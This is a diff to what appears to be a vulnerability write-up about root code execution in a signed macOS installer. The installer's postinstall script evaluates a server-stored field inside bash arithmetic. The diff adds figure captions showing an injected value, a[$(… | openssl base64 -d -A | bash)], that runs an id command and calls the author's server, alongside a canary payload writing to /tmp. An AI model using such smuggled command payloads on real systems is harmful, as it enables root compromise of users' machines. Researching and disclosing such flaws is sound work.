@@ -197,6 +197,12 @@ GET /v2/feedback/<my-canary-id>?plain=1
 custom.installCount:"a[$(id > /tmp/canary_root)]"
 ```
 
+<figure>
+  <img src="{{ '/assets/img/writeups/rce-instalador-macos/02-payload-en-el-servidor.png' | relative_url }}"
+       alt="Terminal: reading the stored record back, the installationCounter field contains a[$(echo ...base64... | openssl base64 -d -A | bash)]">
+  <figcaption>The value, already stored on the server and read back. Where a number should be there is a command substitution: <code>a[$(…)]</code>. The base64 is an <code>id</code> and a call to my own server.</figcaption>
+</figure>
+
 ## And how does the attacker know my identifier?
 
 Good question, and it is the one separating a theoretical finding from a real one. The
@@ -229,6 +235,12 @@ Summed up in five steps:
 3. The `postinstall`, running **as root**, downloads that value.
 4. The parsing loop puts it in a variable, stripping only the quotes.
 5. `$((install_count + 1))` **evaluates** it, and the order runs as root.
+
+<figure>
+  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-bash-evalua.png' | relative_url }}"
+       alt="macOS terminal: the signed package is expanded, its postinstall is run with sudo, and bash fails with «syntax error: operand expected» while trying to evaluate the downloaded content as arithmetic">
+  <figcaption>The signed package's <code>postinstall</code>, running as root. Bash complains <code>syntax error: operand expected</code> while trying to <strong>evaluate</strong> what it has just downloaded: proof that the value lands in <code>$(( ))</code>.</figcaption>
+</figure>
 
 <figure>
   <img src="{{ '/assets/img/writeups/rce-instalador-macos/01-callback.png' | relative_url }}"
